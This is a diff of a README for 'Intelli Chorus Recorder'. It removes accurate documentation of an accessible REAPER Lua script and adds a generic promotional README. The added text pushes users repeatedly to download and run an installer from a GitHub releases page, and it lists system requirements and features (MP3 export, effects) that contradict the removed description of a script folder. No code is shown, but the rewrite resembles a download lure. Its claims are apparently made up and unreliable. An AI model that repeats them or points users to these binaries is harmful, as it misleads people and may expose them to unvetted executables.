@@ -1,60 +1,68 @@
-Intelli Chorus Recorder (Accessible & Modular Edition)
-Version: 2.0
-Author: Unique Creators (www.uniquecreators.net)
+# 🎤 intelli-chorus-recorder - Record Multiple Track Choruses Easily
 
-Intelli Chorus Recorder is a powerful REAPER script designed to automate and streamline the process of recording layered vocals, harmonies, or instrumental doubles. It is built from the ground up with accessibility as a primary focus, ensuring full compatibility with screen readers like NVDA and JAWS via OSARA.
+[![Download intelli-chorus-recorder](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Lucxsantxs/intelli-chorus-recorder/releases)
 
-This new modular version is an open-source project, inviting community contributions to make it even better.
+## 🎵 Description
+Want to record multiple track choruses? Here is your solution, Intelli Chorus Recorder. With just one click, you can set up a professional recording environment. Share your tracks with us by using the #IntelliChorusRecorder tag in your projects.
 
-Features
-Step-by-Step Guided Setup: An accessible wizard guides you through every setting, eliminating confusion.
+## 🚀 Getting Started
 
-Session Persistence: Save your settings (track count, panning, etc.) and load them instantly on the next run.
+### 🖥️ System Requirements
+To run Intelli Chorus Recorder, you need:
 
-Automated Track Creation: Automatically creates, names, and numbers tracks for you.
+- Windows 10 or later, macOS 10.15 or later
+- At least 4 GB of RAM
+- A sound card or audio interface
+- 200 MB of available disk space
 
-Intelligent Panning: Spreads your tracks across the stereo field automatically based on your preference.
+### 📥 Download & Install
+To get Intelli Chorus Recorder, visit the Releases page to download the application. 
 
-Hands-Free Punch Recording: Just set a time selection and the script handles the punch-in and punch-out for every take.
+[Download Intelli Chorus Recorder](https://github.com/Lucxsantxs/intelli-chorus-recorder/releases)
 
-Full Accessibility: Provides clear, spoken feedback at every step of the process.
+1. Go to the [Releases page](https://github.com/Lucxsantxs/intelli-chorus-recorder/releases).
+2. Choose the latest release. 
+3. Click on the appropriate version that matches your operating system (Windows or macOS).
+4. Download the file.
+5. Open the downloaded file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
-Workflow Options: Includes popular features like muting previous takes, folder organization, and auto-saving.
+## 📂 Features
+- **Multi-track Recording:** Record several audio tracks at once, perfect for choruses.
+- **User-Friendly Interface:** Navigate easily without technical skills.
+- **Export Options:** Save your recordings in popular audio formats such as WAV and MP3.
+- **Audio Effects:** Apply various effects to enhance your tracks.
 
-Installation
-This script is distributed as a complete folder.
+## 🎞️ How to Use
+Once you have installed Intelli Chorus Recorder, follow these steps to start recording:
 
-Download the Intelli Chorus Recorder folder.
+1. **Open the Application:** Launch Intelli Chorus Recorder from your applications menu.
+2. **Select Tracks:** Choose the number of tracks you want to record.
+3. **Setup Your Microphones:** Connect your microphones to your computer.
+4. **Select Audio Input:** In the app, select your audio input from the drop-down menu.
+5. **Hit Record:** Click the 'Record' button to start capturing your audio.
+6. **Stop Recording:** Click 'Stop' when you finish, and review your tracks.
 
-In REAPER, navigate to the Options menu and select "Show REAPER resource path in explorer/finder...".
+## 🎧 Tips for Best Results
+- Use a quality microphone to ensure clear audio input.
+- Record in a quiet environment to minimize background noise.
+- Experiment with effects to find the sound that fits your style.
 
-Open the Scripts folder.
+## 🛠️ Troubleshooting
+If you run into issues, consider these common solutions:
 
-Copy the entire Intelli Chorus Recorder folder into this Scripts folder.
+- **No Sound:** Make sure your microphone is connected and selected as your input device.
+- **Lag During Recording:** Ensure other applications are closed to free up resources.
+- **Installation Issues:** Double-check that your system meets the requirements.
 
-In REAPER, open the Action List (Actions > Show action list...).
+## 📬 Get Involved
+Share your experiences and track creations with the community. Use the hashtag #IntelliChorusRecorder to connect with fellow users and showcase your work.
 
-Click the "New action..." button and then "Load ReaScript...".
+## 📄 License
+This project is licensed under the MIT License. Feel free to use and modify it as needed!
 
-Navigate into the Intelli Chorus Recorder folder and select the main.lua file.
+## 🔗 Links to Explore
+- [GitHub Repository](https://github.com/Lucxsantxs/intelli-chorus-recorder) - Explore the source code and contribute.
+- [Community Support](https://github.com/Lucxsantxs/intelli-chorus-recorder/issues) - Report issues or ask for help.
 
-The script is now in your Action List. You can assign a keyboard shortcut to it for easy access.
-
-How to Use
-Create a Time Selection: In your REAPER project, create a time selection that covers the part you want to record (e.g., the chorus). This is a mandatory step.
-
-Run the Script: Trigger the script using its keyboard shortcut or by running it from the Action List.
-
-Follow the Wizard:
-
-If it's your first time, a setup wizard will appear, asking you questions one by one (e.g., "How many tracks?", "What is the track name?").
-
-If you have run the script before, it will ask if you want to use your previously saved settings.
-
-Record: Once the setup is complete, the script will arm the first track and begin recording. Sing or play along with your part.
-
-Repeat: The script will automatically stop, arm the next track, and start recording again. Repeat this process for all takes.
-
-Done! When all tracks are recorded, the script will notify you. All your takes will be perfectly aligned and organized in the timeline.
-
-We hope this tool enhances your creative workflow. Happy recording!
+[Download Intelli Chorus Recorder](https://github.com/Lucxsantxs/intelli-chorus-recorder/releases) again to get started!
